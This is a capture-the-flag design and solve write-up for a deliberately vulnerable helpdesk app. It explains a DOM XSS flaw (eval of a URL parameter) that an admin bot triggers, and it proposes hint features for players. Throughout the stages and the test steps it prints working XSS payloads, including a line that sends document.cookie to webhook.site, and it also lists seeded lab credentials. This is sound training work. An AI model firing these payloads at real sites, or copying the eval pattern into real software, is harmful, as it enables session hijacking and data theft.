# CTF_4 IntraDesk — Deep Security Analysis

---

## 1. Architecture Map

### System Components

```
┌─────────────────────────────────────────────────────────────┐
│                        FRONTEND (Vite/React)                 │
│  Port 5174                                                   │
│                                                              │
│  /login          → AuthPage (login/register)                 │
│  /kb             → KnowledgeBase.tsx  ← VULNERABILITY HERE  │
│  /report         → ReportPage.tsx                            │
│  /captures       → CapturesPage.tsx                          │
│  /admin          → AdminPage.tsx (admin only)                │
└──────────────────────────┬──────────────────────────────────┘
                           │ fetch()
┌──────────────────────────▼──────────────────────────────────┐
│                        BACKEND (Express)                     │
│  Port 3001                                                   │
│                                                              │
│  POST /api/auth/login                                        │
│  POST /api/auth/register                                     │
│  POST /api/report/submit    → pushes to BullMQ queue         │
│  GET  /api/admin/flag       ← ADMIN ONLY + flag endpoint     │
│  POST /api/exfil/capture    ← PUBLIC endpoint                │
│  GET  /api/captures         ← authenticated player reads     │
└──────────┬───────────────────────────┬──────────────────────┘
           │                           │
┌──────────▼──────────┐   ┌────────────▼────────────┐
│   PostgreSQL         │   │   Redis + BullMQ         │
│   - users table      │   │   - report queue         │
│   - flags table      │   │                          │
│   - captures table   │   └────────────┬────────────┘
│   - reports table    │                │ job dequeued
└──────────────────────┘   ┌────────────▼────────────┐
                           │   Playwright Bot         │
                           │   - logs in as admin     │
                           │   - visits report URL    │
                           │   - appends _reportId=X  │
                           └─────────────────────────┘
```

### Request/Response Exploit Chain Sequence

```
Player Browser                  Backend API              Bot Browser (Playwright)
     │                              │                            │
     │── POST /api/auth/register ──►│                            │
     │◄─ 200 { userId, token } ─────│                            │
     │                              │                            │
     │── POST /api/report/submit ──►│                            │
     │   { url: "http://...kb?      │                            │
     │     callback=PAYLOAD" }      │── enqueue job ──►[Queue]   │
     │◄─ 200 { reportId: 42 } ──────│                    │       │
     │                              │                    │       │
     │                              │         [Bot dequeues job] │
     │                              │                    │──────►│
     │                              │                    │  visits:
     │                              │                    │  /kb?callback=PAYLOAD
     │                              │                    │  &_reportId=42
     │                              │                            │
     │                              │                    eval(PAYLOAD) executes
     │                              │                            │
     │                              │◄── GET /api/admin/flag ────│
     │                              │    ?reportId=42            │
     │                              │── 200 { flag: "CTF{...}" }►│
     │                              │                            │
     │                              │◄── POST /api/exfil/capture─│
     │                              │    { data: {flag:...},     │
     │                              │      reportId: 42 }        │
     │                              │── 200 OK ─────────────────►│
     │                              │                            │
     │── GET /api/captures ────────►│                            │
     │◄─ 200 [{ data: {flag:...} }]─│                            │
     │                              │                            │
[Player reads flag]
```

---

## 2. Vulnerability Breakdown

### Exact Location

**File:** `CTFs/CTF_4_corporate_helpdesk/web/src/pages/KnowledgeBase.tsx`

**Function:** `headerCallbackRef` (a React `useCallback` ref)

```tsx
const headerCallbackRef = useCallback((node: HTMLHeadingElement | null) => {
  if (node) {
    const urlParams = new URLSearchParams(window.location.search);
    const rawSearch = urlParams.get('search') || '';

    // Vector 1: innerHTML XSS
    node.innerHTML = 'Results for "' + rawSearch + '"';

    // Vector 2: eval() XSS — the intended path
    const callback = urlParams.get('callback');
    if (callback) {
      eval(callback);  // ← arbitrary JS execution, no sanitization
    }
  }
}, [searchTerm, selectedTag]);
```

### Why This is DOM XSS (Not Reflected/Stored)

| Property | This Challenge |
|---|---|
| Server sees payload? | No — `callback` never reaches the backend |
| Server response modified? | No — HTML is static |
| Payload lives in? | URL fragment / query string, parsed client-side |
| Execution site | Browser DOM via `URLSearchParams` + `eval()` |
| Classification | **DOM XSS (Type-0)** |

The server returns the same static React bundle regardless of the `callback` value. The payload is read and executed entirely within the browser by JavaScript after page load — the server is never involved in the injection.

### Why It Works Specifically in Bot Context

The bot (Playwright) is authenticated as admin and visits the URL with a real browser session:

1. Bot has admin session cookies set
2. Bot navigates to the full URL including `callback=PAYLOAD`
3. React mounts `KnowledgeBase.tsx`, `useCallback` ref fires
4. `eval(callback)` runs **with the bot's admin cookies active**
5. `fetch('/api/admin/flag')` inherits the bot's session — same-origin request carries cookies automatically
6. The admin endpoint returns the flag because the **requester is authenticated as admin**

Without the bot's admin session, `fetch('/api/admin/flag')` would return `403 Forbidden`.

### How `_reportId` Becomes Available

**File:** `CTFs/CTF_4_corporate_helpdesk/bot/src/bot.ts`

The bot retrieves the job, constructs the URL, and appends `_reportId`:

```typescript
const visitUrl = new URL(job.data.url);
visitUrl.searchParams.set('_reportId', String(job.data.reportId));
await page.goto(visitUrl.toString());
```

This means `location.search` inside the bot's browser will contain both the original params **and** `_reportId=X`. The payload reads it back via:

```javascript
new URLSearchParams(location.search).get('_reportId')
```

### Flag Logic — Per-User Verification

**File:** `CTFs/CTF_4_corporate_helpdesk/api/src/routes/admin.ts`

```typescript
// GET /api/admin/flag?reportId=X
// Requires: isAdmin middleware
const report = await db.query(
  'SELECT user_id FROM reports WHERE id = $1', [reportId]
);
const flag = await db.query(
  'SELECT flag FROM flags WHERE user_id = $1', [report.rows[0].user_id]
);
res.json({ flag: flag.rows[0].flag });
```

The flag returned is **the flag of the user who submitted the report**, not the admin's flag. This is why the bot appending `_reportId` is critical — it links the admin's authenticated fetch back to the specific player's flag.

### Defensive Code Audit

| Defense | Present? | Notes |
|---|---|---|
| CSP headers | ❌ No | `eval()` would be blocked by `script-src 'self'` |
| DOMPurify on innerHTML | ❌ No | Raw user input in `innerHTML` |
| Input validation on `callback` | ❌ No | Direct `eval()` |
| URL allowlist on report submission | ❌ No | Any URL accepted |
| `httpOnly` cookies | Check needed | If set, `document.cookie` theft blocked |
| Rate limiting on `/report` | Unknown | Could limit brute-force |
| Bot URL validation | ❌ No | Bot visits any submitted URL |

---

## 3. Exploit Workflow — Attacker's Discovery Journey

### Stage 1: Discovering URL Controls the KB Page

**What clues exist (black-box):**

1. Player navigates to `/kb` — sees a search box
2. Submits a search — URL becomes `/kb?search=hello&tag=`
3. Page heading reads: *Results for "hello"*
4. Player tries: `/kb?search=<b>bold</b>` — heading renders **bold**
5. This immediately signals `innerHTML` is used

**DevTools clue:**
- Open DevTools → Elements panel
- Inspect the `<h2>` or heading element containing "Results for..."
- Notice the raw HTML reflects the `search` param verbatim

**Small test payload:**
```
/kb?search=<img src=x onerror=alert(1)>
```
→ Alert fires. Player confirms HTML injection.

---

### Stage 2: Discovering the `callback` Parameter

**This is the first major friction point.** The `callback` param is not visible in the UI.

**Discovery path (black-box):**

1. Player reads page source (View Source or DevTools → Sources)
2. Finds the compiled JS bundle — difficult to read but searchable
3. DevTools → Sources → Search all files (`Cmd+Option+F`) for `"callback"`
4. Finds minified reference to `URLSearchParams` + `eval`

**Alternatively:** Common parameter fuzzing
- Tools like `ffuf` or Burp Intruder with a param wordlist
- `callback` is a very common parameter name (used in JSONP patterns)
- Player tries: `/kb?callback=alert(1)` → alert fires

**Small test payload:**
```
/kb?callback=alert(document.domain)
```
→ Confirms arbitrary JS execution in page context.

**Code location giving this away:**
```
KnowledgeBase.tsx → urlParams.get('callback') → eval(callback)
```

---

### Stage 3: Confirming Bot Execution

**Discovery path:**

1. Player navigates to `/report` — sees a URL submission form
2. Submits: `http://localhost:5174/kb?callback=alert(1)`
3. Nothing happens visually for the player
4. Player needs to know the bot is visiting their URL

**Clue hunting:**
- Player checks Network tab after report submission — sees `POST /api/report/submit` returns `{ reportId: 7 }`
- Player checks if there's a status endpoint: `GET /api/report/7` (may return visited status)
- The challenge description or UI should hint "a moderator will review your report"

**Confirmation test:**
```
/kb?callback=fetch('https://webhook.site/YOUR_ID?c='.concat(document.cookie))
```
→ If webhook receives a request, bot confirmed.

**Alternative (no external server):**
```
/kb?callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
```
→ Check `/captures` — if entry appears, bot executed the payload.

---

### Stage 4: Discovering `_reportId`

**This is the second major friction point.** Players must know `_reportId` is appended by the bot.

**Discovery path:**

1. From Stage 3, player used `/captures` and saw `reportId: 'test'` (their hardcoded value)
2. Player now wants to know: *what URL did the bot actually visit?*
3. Player crafts a payload to exfiltrate `location.href`:

```javascript
fetch('/api/exfil/capture',{ 
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({data:location.href,reportId:'url_test'})
})
```

4. Player checks `/captures` — sees the full URL including `&_reportId=42`
5. Player now knows `_reportId` is available as a query parameter

**Code that appends it:**
```typescript
// bot.ts
visitUrl.searchParams.set('_reportId', String(job.data.reportId));
```

---

### Stage 5: Discovering `/api/admin/flag`

**Discovery path:**

1. Player explores API endpoints manually
2. Tries common patterns: `/api/flag`, `/api/user/flag`, `/api/admin/flag`
3. `/api/admin/flag` returns `403 Forbidden` for normal users — but **this 403 is the breadcrumb**
4. Player confirms endpoint exists and is admin-protected
5. Player realizes: *the bot is admin — if I make the bot fetch this endpoint...*

**Network tab test:**
```
GET /api/admin/flag?reportId=1
→ 403 { error: "Admin access required" }
```

The `reportId` query parameter visible in the 403 response hints at the expected usage.

---

### Stage 6: Discovering `/api/exfil/capture`

**Discovery path:**

1. Player already used this in Stage 3 (self-exfil test)
2. Or player checks the app for any "submission" endpoints
3. Network tab: when `/captures` page loads, player sees `GET /api/captures`
4. Player infers: if there's a GET, there's a POST to create entries
5. Tries `POST /api/exfil/capture` with arbitrary JSON → `200 OK`

**Confirmation:**
```bash
curl -X POST http://localhost:3001/api/exfil/capture \
  -H "Content-Type: application/json" \
  -d '{"data":"test","reportId":"1"}'
# → 200 OK
```

---

### Stage 7: Combining Into the Final Exploit

Player now has all pieces:

| Piece | Source |
|---|---|
| XSS via `eval(callback)` | Stage 2 |
| Bot visits URL as admin | Stage 3 |
| `_reportId` appended to URL | Stage 4 |
| `/api/admin/flag?reportId=X` returns flag | Stage 5 |
| `POST /api/exfil/capture` stores data | Stage 6 |
| `GET /api/captures` reads it back | Stage 3 |

**Iteration toward final payload:**

```javascript
// Attempt 1 — naive (broken due to + encoding)
fetch('/api/admin/flag?reportId=' + new URLSearchParams(location.search).get('_reportId'))

// Attempt 2 — fix concatenation with .concat()
fetch('/api/admin/flag?reportId='.concat(
  new URLSearchParams(location.search).get('_reportId')
))
.then(function(r){ return r.json() })
.then(function(d){
  fetch('/api/exfil/capture',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({data:d, reportId:new URLSearchParams(location.search).get('_reportId')})
  })
})
```

---

## 4. Friction Analysis Table

| # | Friction Point | Why Difficult | Difficulty | Type |
|---|---|---|---|---|
| 1 | Discovering `callback` param | Not in UI; requires source reading or param fuzzing | **High** | Mechanical |
| 2 | Knowing bot appends `_reportId` | No UI hint; requires URL exfil to discover | **High** | Conceptual |
| 3 | `+` decoded as space in URLs | Subtle encoding bug; breaks payload silently | **High** | Mechanical |
| 4 | Knowing `/api/admin/flag` exists | Requires API enumeration; 403 is the only clue | **Medium** | Mechanical |
| 5 | Confirming bot executed payload | No visual feedback; requires exfil-to-captures loop | **Medium** | Conceptual |
| 6 | Knowing bot runs as admin | Challenge description must state this | **Low** | Conceptual |
| 7 | `fetch()` carries cookies automatically | Players may think they need to steal/forward cookies | **Low** | Conceptual |
| 8 | Finding `/api/exfil/capture` is public | Players may assume all endpoints need auth | **Low** | Conceptual |

---

## 5. Minimal Scaffolding Recommendations

### 5.1 Show Visited URL in Report Status

**File:** `CTFs/CTF_4_corporate_helpdesk/web/src/pages/ReportPage.tsx`

Add a "report status" view that shows the URL the bot actually visited (post-processing):

````tsx
// filepath: CTFs/CTF_4_corporate_helpdesk/web/src/pages/ReportPage.tsx
// ...existing code...
{reportStatus && (
  <div className="report-status">
    <p>Status: {reportStatus.status}</p>
    {reportStatus.visitedUrl && (
      <p className="hint">
        Bot visited: <code>{reportStatus.visitedUrl}</code>
      </p>
    )}
  </div>
)}
// ...existing code...
````

**Why it helps:** Removes the hardest friction point — players immediately see `_reportId` in the visited URL without needing to build a self-exfil payload first.

**Does NOT reveal exploit:** Player still needs to discover `eval`, construct the payload, find the flag endpoint, and handle URL encoding.

---

### 5.2 Add a `GET /api/report/:id` Status Endpoint

**File:** `CTFs/CTF_4_corporate_helpdesk/api/src/routes/report.ts`

````typescript
// filepath: CTFs/CTF_4_corporate_helpdesk/api/src/routes/report.ts
// ...existing code...
router.get('/:id', requireAuth, async (req, res) => {
  const { id } = req.params;
  const result = await db.query(
    `SELECT id, status, visited_url, created_at 
     FROM reports 
     WHERE id = $1 AND user_id = $2`,
    [id, req.user.id]
  );
  if (!result.rows.length) return res.status(404).json({ error: 'Not found' });
  res.json(result.rows[0]);
});
// ...existing code...
````

**Why it helps:** Players can poll this endpoint to see `visited_url` — the exact URL the bot visited including `_reportId`. Natural discovery via Network tab.

**Does NOT reveal exploit:** Still requires understanding `eval`, flag endpoint, and exfil chain.

---

### 5.3 Return `reportId` in Report Submission Response

**File:** `CTFs/CTF_4_corporate_helpdesk/api/src/routes/report.ts`

The submission response should clearly include the `reportId`:

````typescript
// filepath: CTFs/CTF_4_corporate_helpdesk/api/src/routes/report.ts
// ...existing code...
res.json({ 
  success: true, 
  reportId: newReport.id,
  message: 'Report queued. A moderator bot will review shortly.'
});
// ...existing code...
````

**Why it helps:** Players know their `reportId` immediately, can cross-reference with exfil captures, and understand the per-report flag system.

---

### 5.4 Add a 403 Breadcrumb Comment to Admin Endpoint

**File:** `CTFs/CTF_4_corporate_helpdesk/api/src/routes/admin.ts`

Make the 403 response slightly more descriptive:

````typescript
// filepath: CTFs/CTF_4_corporate_helpdesk/api/src/routes/admin.ts
// ...existing code...
if (!req.user?.isAdmin) {
  return res.status(403).json({ 
    error: 'Admin access required',
    hint: 'This endpoint requires admin authentication. Query param: reportId'
  });
}
// ...existing code...
````

**Why it helps:** Players who enumerate the API discover the endpoint *and* the expected `reportId` parameter in one request — reduces guesswork without revealing the exploit.

---

### 5.5 Hint System in `/captures` Page

**File:** `CTFs/CTF_4_corporate_helpdesk/web/src/pages/CapturesPage.tsx`

If captures are empty, show a staged hint:

````tsx
// filepath: CTFs/CTF_4_corporate_helpdesk/web/src/pages/CapturesPage.tsx
// ...existing code...
{captures.length === 0 && (
  <div className="empty-hint">
    <p>No captures yet. Try submitting a report with a URL that POSTs data here.</p>
    <p>Endpoint: <code>POST /api/exfil/capture</code> — accepts JSON body</p>
  </div>
)}
// ...existing code...
````

**Why it helps:** Solves friction point #6 — players immediately know the exfil endpoint exists and accepts POST requests.

---

## 6. Intended Learning Ladder

### Stage 1 — Control URL State

| | Detail |
|---|---|
| **What player sees** | `/kb` search page with heading "Results for X" |
| **What to try** | Change `?search=` in URL, observe heading changes |
| **Success** | Heading updates dynamically — URL drives page state |
| **File** | `KnowledgeBase.tsx` — `urlParams.get('search')` → `node.innerHTML` |

---

### Stage 2 — Confirm DOM Injection

| | Detail |
|---|---|
| **What player sees** | `search` param reflected in heading |
| **What to try** | `/kb?search=<b>test</b>` → bold text renders |
| **Success** | HTML tags execute — `innerHTML` confirmed |
| **File** | `KnowledgeBase.tsx` line: `node.innerHTML = 'Results for "' + rawSearch + '"'` |

---

### Stage 3 — Confirm JS Execution

| | Detail |
|---|---|
| **What player sees** | HTML injection works; look for JS execution path |
| **What to try** | `/kb?search=<img src=x onerror=alert(1)>` then `/kb?callback=alert(1)` |
| **Success** | Alert fires from `callback` param — `eval()` confirmed |
| **File** | `KnowledgeBase.tsx` line: `eval(callback)` |

---

### Stage 4 — Confirm Bot Execution

| | Detail |
|---|---|
| **What player sees** | `/report` page accepts URLs |
| **What to try** | Submit URL with `callback=fetch('/api/exfil/capture',...)` posting static data |
| **Success** | Entry appears in `/captures` — bot executed payload |
| **File** | `bot.ts` → `page.goto(visitUrl)`, `ReportPage.tsx` |

---

### Stage 5 — Discover `_reportId`

| | Detail |
|---|---|
| **What player sees** | Bot executed — want to know exact URL visited |
| **What to try** | Payload that exfiltrates `location.href` to `/captures` |
| **Success** | Sees full URL in capture including `&_reportId=42` |
| **File** | `bot.ts` → `visitUrl.searchParams.set('_reportId', ...)` |

---

### Stage 6 — Discover Admin Flag Endpoint

| | Detail |
|---|---|
| **What player sees** | Per-user flag must exist somewhere; bot is admin |
| **What to try** | `GET /api/admin/flag?reportId=42` as normal user → `403` |
| **Success** | `403` confirms endpoint exists; bot (admin) can call it |
| **File** | `admin.ts` → `requireAdmin` middleware → flag query |

---

### Stage 7 — Combine Into Exploit

| | Detail |
|---|---|
| **What player sees** | All pieces assembled |
| **What to try** | Build payload: read `_reportId` → fetch flag → POST to captures |
| **Success** | Flag appears in `/captures` page |
| **Key insight** | Use `.concat()` not `+` for string building in URL params |
| **File** | All of the above combined |

---

## 7. Security Design Commentary

### Why `eval()` is Catastrophic Here

`eval()` doesn't just execute code — it executes it in the **current execution context**, with access to all in-scope variables, the DOM, and crucially, the browser's **cookie jar** for the current origin. There is no sandboxing. Combined with an admin bot that has privileged session cookies, a single `eval()` call becomes a full session compromise vector.

### Why DOM XSS in Admin Bot Context is Particularly Dangerous

Standard DOM XSS requires the attacker to trick the **victim** into visiting a URL. In this CTF design (which mirrors real bug bounty scenarios), the "victim" is a **guaranteed automated visitor with elevated privileges**. This models real-world patterns like:

- Admin dashboards with XSS + CSRF bypass
- Customer support bots that preview user-submitted links
- Automated security scanners visiting malicious pages

The bot pattern elevates DOM XSS from "requires social engineering" to "fully automated privilege escalation."

### Why Per-User Flags Are Excellent CTF Design

| Property | Benefit |
|---|---|
| Flag `=` f(userId, reportId) | Players cannot share solutions — each flag is unique |
| Bot uses `reportId` to identify submitter | Ties admin's privileged action back to specific player |
| Flag not stored in bot's session | No shortcut — must exploit the full chain |
| Public exfil endpoint | Removes auth complexity from the *delivery* mechanism |

This design forces every player to understand and execute the **full exploit chain** rather than copying a peer's flag — the hallmark of a well-designed CTF challenge.

---



















# 8. Implementation Summary

### What Was Already Implemented (Pre-Existing)

| Component | Status |
|---|---|
| DB schema (`users`, `kb_articles`, `reports`, `exfil_logs`) | ✅ Existing |
| KB articles seeds (8 articles) | ✅ Existing |
| `GET /api/kb/articles`, `GET /api/kb/articles/:id`, `GET /api/kb/tags` | ✅ Existing |
| `KnowledgeBase.tsx` with URL-driven search, tag filter, DOM XSS (`innerHTML` + `eval`) | ✅ Existing |
| `KBArticle.tsx` (individual article view) | ✅ Existing |
| `POST /api/report` (submit, queue to BullMQ) | ✅ Existing |
| `GET /api/report/my-reports` | ✅ Existing |
| Bot worker (Playwright): dequeues, appends `_reportId`, visits as admin | ✅ Existing |
| `POST /api/exfil/capture` (public) | ✅ Existing |
| `GET /api/exfil/my-captures` (authenticated) | ✅ Existing |
| `GET /api/admin/flag?reportId=` (returns reporter's flag) | ✅ Existing |
| `Captures.tsx`, `Report.tsx`, `App.tsx`, routing | ✅ Existing |
| JWT auth, `authenticate` + `requireAdmin` middleware | ✅ Existing |

### Changes Made in This Session

#### `infra/init.sql`
- Added `visited_url TEXT` and `bot_console_logs TEXT` columns to `CREATE TABLE reports`
- Added seed inserts for player users `abcd12`, `efgh34`, `ijkl56` (with placeholder hashes replaced at runtime)
- Fixed admin seed from `$2b$10$YourHashedPasswordHere` placeholder to correct placeholder

#### `apps/api/src/db/index.ts`
- Fixed admin `UPDATE` query: was using `admin@intradesk.local` (wrong), changed to `admin`
- Replaced `UPDATE` pattern with `INSERT ... ON CONFLICT DO UPDATE` (upsert)
- Added `ALTER TABLE reports ADD COLUMN IF NOT EXISTS visited_url / bot_console_logs` migration (handles pre-existing DBs)
- Added seeding loop for all 3 player users (`abcd12`, `efgh34`, `ijkl56`) with bcrypt-hashed passwords and correct flags

#### `apps/api/src/routes/report.ts`
- `GET /report/my-reports`: expanded query to include `visited_url` and `bot_console_logs`
- `PUT /report/internal/update/:reportId`: now accepts `visited_url` and `console_logs` fields and persists them
- Added `GET /report/:id` (owner-only): returns full report detail including `visited_url`, `bot_console_logs`, `last_error`

#### `apps/bot/src/index.ts`
- Moved `resolvedUrl` and `consoleLogs` declarations before the `try` block (needed for catch-block access)
- Changed `page.on('console')` to append each message to `consoleLogs[]`
- Both success and error update calls now include `visited_url: resolvedUrl` and `console_logs: consoleLogs.join('\n')`

#### `apps/api/src/routes/admin.ts`
- Removed global `router.use(requireAdmin)`
- Added explicit `requireAdmin` per-route to `/reports` and `/exfil-logs`
- `/flag` route now has an inline 403 check with `hint: 'This endpoint requires admin authentication. Expected query param: reportId'`

#### `apps/web/src/pages/Report.tsx`
- Expanded `Report` interface with `visited_url` and `bot_console_logs` fields
- Added `expandedLogs` state + `toggleLogs()` helper
- Added `statusBadge()` helper for coloured status pills
- Replaced flat table with per-report cards showing:
  - Submitted URL
  - **Bot visited URL** (highlighted blue card, reveals `_reportId`)
  - Timestamps
  - Expandable bot console log panel (dark terminal style)
- Submit success message now includes `Report #N` ID

#### `apps/web/src/pages/Captures.tsx`
- Empty state now includes an info box explaining `POST /api/exfil/capture`, expected JSON body, and that no auth is required

#### `apps/web/src/pages/Dashboard.tsx`
- Fixed `user?.email` → `user?.username` (the JWT and User interface only carry `username`)

#### `apps/web/src/components/Layout.tsx`
- Fixed `user?.email` → `user?.username` in the header nav

---

### Environment Variables

No new env vars added. Existing `.env.example` is complete. Key vars for reference:

```dotenv
DATABASE_URL=postgresql://intradesk:intradesk_password@db:5432/intradesk_kb
REDIS_URL=redis://redis:6379
JWT_SECRET=your-super-secret-jwt-key
ADMIN_PASSWORD=admin_secure_password_123
ADMIN_USERNAME=admin
BOT_BASE_URL=http://web:5173
BOT_API_URL=http://api:4001
```

---

### Manual Test Steps — Full Offline Solve

#### 1. Start the stack
```bash
cd CTFs/CTF_4_corporate_helpdesk
docker-compose up -d
# Wait ~30s for DB init + bot ready
```

#### 2. Log in as a player
```
http://localhost:5174/login
Username: abcd12
Password: KHXXSIILQYIF
```

#### 3. Verify DOM injection
```
http://localhost:5174/kb?search=<b>BOLD</b>
```
→ Heading renders `Results for "BOLD"` in bold text — confirms `innerHTML`.

#### 4. Confirm eval() execution
```
http://localhost:5174/kb?callback=alert(document.domain)
```
→ Alert fires with `localhost` — confirms arbitrary JS execution.

#### 5. Confirm bot exists and exfil endpoint works
Submit this URL on `/report`:
```
http://localhost:5174/kb?callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
```
→ Check `/captures` — entry appears. Bot executed the payload.

#### 6. Discover `_reportId` via URL exfil
After step 5, the `/report` page shows "**🤖 Bot visited URL:**" in your report card.  
The URL will be: `.../kb?callback=...&_reportId=7` — you can see the `_reportId` value directly.

Alternatively, exfiltrate `location.href`:
```javascript
fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:location.href,reportId:'url_test'})})
```

#### 7. Discover the admin flag endpoint
```
GET http://localhost:4001/api/admin/flag?reportId=1
```
→ Returns `403 { error: 'Admin access required', hint: 'Expected query param: reportId' }`  
→ Confirms endpoint exists and needs admin auth + `reportId` param.

#### 8. Craft the final exploit

Build this callback (use `.concat()` — not `+` — to avoid URL `+`→space decoding):

```javascript
fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

Submit this URL on `/report`:
```
http://localhost:5174/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new%20URLSearchParams(location.search).get('_reportId'))).then(function(r){return%20r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new%20URLSearchParams(location.search).get('_reportId')})})})
```

#### 9. Retrieve the flag
- Wait ~5 seconds
- Navigate to `/captures`
- The captured data will contain: `{ "flag": "CTF{user_abcd12_8bb73ad76fdd80e0}" }`

**Flag:** `CTF{user_abcd12_8bb73ad76fdd80e0}` (unique per player)

---

### File Change List

| File | Change Type | Summary |
|---|---|---|
| `infra/init.sql` | Modified | Added `visited_url`, `bot_console_logs` columns; added player user seeds |
| `apps/api/src/db/index.ts` | Modified | Fixed admin username; added migration; upserts all 4 users with bcrypt |
| `apps/api/src/routes/report.ts` | Modified | Expanded `my-reports` query; updated `PUT internal/update`; added `GET /:id` |
| `apps/bot/src/index.ts` | Modified | Collect console logs; send `visited_url` + `console_logs` on update |
| `apps/api/src/routes/admin.ts` | Modified | Per-route `requireAdmin`; custom 403 hint on `/flag` |
| `apps/web/src/pages/Report.tsx` | Modified | Card layout with `visited_url` + expandable bot console logs |
| `apps/web/src/pages/Captures.tsx` | Modified | Empty state hint about `POST /api/exfil/capture` |
| `apps/web/src/pages/Dashboard.tsx` | Modified | Fixed `user?.email` → `user?.username` |
| `apps/web/src/components/Layout.tsx` | Modified | Fixed `user?.email` → `user?.username` |
